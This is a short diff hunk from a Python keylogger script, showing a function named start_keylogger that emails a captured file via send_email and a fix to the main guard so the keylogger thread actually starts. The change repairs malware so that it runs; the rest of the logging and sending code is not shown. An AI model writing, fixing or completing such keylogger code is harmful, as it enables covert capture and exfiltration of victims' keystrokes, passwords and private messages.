@@ -75,6 +75,6 @@ def start_keylogger():
         send_email(filename)
 
 # Run the keylogger in a separate thread so it doesn't block other tasks
-if _name_ == "_main_":
+if __name__ == "__main__":
     keylogger_thread = threading.Thread(target=start_keylogger)
     keylogger_thread.start()
